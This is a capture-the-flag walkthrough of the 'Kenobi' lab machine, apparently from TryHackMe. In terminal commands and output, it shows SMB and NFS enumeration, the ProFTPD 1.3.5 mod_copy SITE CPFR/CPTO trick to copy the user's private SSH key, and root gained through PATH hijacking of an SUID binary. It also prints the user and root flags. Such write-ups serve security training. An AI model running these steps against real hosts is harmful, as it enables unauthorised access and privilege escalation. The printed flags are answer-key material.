- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Root it
# Scenario

<img src="../../2%20-%20Resources/Others/Flameshots/OcA2KrK.gif" alt="" width="208" height="208" class="jop-noMdConv">

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

# Recon
## Rustscan/Nmap

We can use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass open ports to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) for further scans :

```
Open 10.10.157.52:21
Open 10.10.157.52:22
Open 10.10.157.52:80
Open 10.10.157.52:111
Open 10.10.157.52:139
Open 10.10.157.52:445
Open 10.10.157.52:2049
Open 10.10.157.52:35153
Open 10.10.157.52:43165
Open 10.10.157.52:49545
Open 10.10.157.52:56059

```

Using [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) we can enumerate a machine for [SMB](../../3%20-%20Tags/Hacking%20Concepts/SMB.md) shares.

[Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.157.52`

[SMB](../../3%20-%20Tags/Hacking%20Concepts/SMB.md) has two ports, 445 and 139.

<img src="../../2%20-%20Resources/Others/Flameshots/bkgVNy3.png" alt="" width="454" height="200" class="jop-noMdConv">

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.157.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 16:47 CEST
Nmap scan report for 10.10.157.52
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.157.52\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.157.52\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.157.52\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 26.85 seconds

```

# Enumeration
## SMB

On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

We can access /anonymous :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ smbclient  //10.10.157.52/anonymous
Password for [WORKGROUP\mdn0x]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019

```

You can recursively download the [SMB](../../3%20-%20Tags/Hacking%20Concepts/SMB.md) share too. Submit the username and password as nothing.

`smbget -R smb://10.10.157.52/anonymous`  .

Open the file on the share. There is a few interesting things found.

- Information generated for Kenobi when generating an SSH key for the user
- Information about the ProFTPD server.

## RPC (111)

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts [Remote Procedure Call (RPC)](../../3%20-%20Tags/Hacking%20Concepts/Remote%20Procedure%20Call%20(RPC).md) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.157.52` :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.157.52
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 16:53 CEST
Nmap scan report for 10.10.157.52
Host is up (0.27s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836552.0  6877076.0  22%   16.0T        32000
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 15.87 seconds

```

## FTP (21)

![](../../2%20-%20Resources/Others/Flameshots/L54MBzX.png)

ProFtpd is a free and open-source [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) server, compatible with [Unix](../../3%20-%20Tags/Hacking%20Concepts/Unix.md) and [Windows](../../3%20-%20Tags/Hacking%20Concepts/Windows.md) systems. Its also been vulnerable in the past software versions.

### Netcat

Let's get the version of ProFtpd. Use [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) to connect to the machine on the [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) port :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ nc 10.10.157.52 -p 21 ftp
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.157.52]


```

### Searchsploit

We can use [Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) to find exploits for a particular software version.

[Searchsploit](../../3%20-%20Tags/Hacking%20Tools/Searchsploit.md) is basically just a command line search tool for exploit-db.com :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ searchsploit ProFTPD 1.3.5         
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Me | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execut | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execut | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                        | linux/remote/36742.txt
------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html).

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

# [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md)

We're now going to copy Kenobi's private key using **SITE CPFR and SITE CPTO** commands .

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ nc 10.10.157.52 -p 21 ftp
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.157.52]
SITE CPFR /home/kenobi/.ssh//id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine :

<span style="color: rgb(224, 62, 45);">mkdir /mnt/kenobiNFS</span>  
<span style="color: rgb(224, 62, 45);">mount 10.10.157.52:/var /mnt/kenobiNFS</span>  
<span style="color: rgb(224, 62, 45);">ls -la /mnt/kenobiNFS</span>

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ sudo mkdir /mnt/kenobiNFS
[sudo] password di mdn0x: 

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ sudo mount 10.10.157.52:/var /mnt/kenobiNFS
                                                               
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ ls -la /mnt/kenobiNFS
totale 56
drwxr-xr-x 14 root root  4096  4 set  2019 .
drwxr-xr-x  3 root root  4096 14 lug 17.04 ..
drwxr-xr-x  2 root root  4096  4 set  2019 backups
drwxr-xr-x  9 root root  4096  4 set  2019 cache
drwxrwxrwt  2 root root  4096  4 set  2019 crash
drwxr-xr-x 40 root root  4096  4 set  2019 lib
drwxrwsr-x  2 root staff 4096 12 apr  2016 local
lrwxrwxrwx  1 root root     9  4 set  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096  4 set  2019 log
drwxrwsr-x  2 root mail  4096 27 feb  2019 mail
drwxr-xr-x  2 root root  4096 27 feb  2019 opt
lrwxrwxrwx  1 root root     4  4 set  2019 run -> /run
drwxr-xr-x  2 root root  4096 30 gen  2019 snap
drwxr-xr-x  5 root root  4096  4 set  2019 spool
drwxrwxrwt  6 root root  4096 14 lug 17.02 tmp
drwxr-xr-x  3 root root  4096  4 set  2019 www
                                                                
```

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ sudo chmod 600 id_rsa      

┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Kenobi]
└─$ ssh -i id_rsa kenobi@10.10.157.52

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899

```

# Privilege Escalation with Path Variable Manipulation

|     |     |     |
| --- | --- | --- |
| **Permission** | **On Files** | **On Directories** |
| SUID Bit | User executes the file with permissions of the *file* owner | \-  |
| SGID Bit | User executes the file with the permission of the *group* owner. | File created in directory gets the same group owner. |
| Sticky Bit | No meaning | Users are prevented from deleting files from other users. |

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

```

**/usr/bin/menu**

```
kenobi@kenobi:/$ cd bin
kenobi@kenobi:/bin$ cd ..
kenobi@kenobi:/$ cd usr
kenobi@kenobi:/usr$ cd bin
kenobi@kenobi:/usr/bin$ menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic

```

Strings is a command on Linux that looks for human readable strings on a binary.

![](../../2%20-%20Resources/Others/Flameshots/toHFALv.png)

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) :

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

# cd root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02

```

Pwned !!
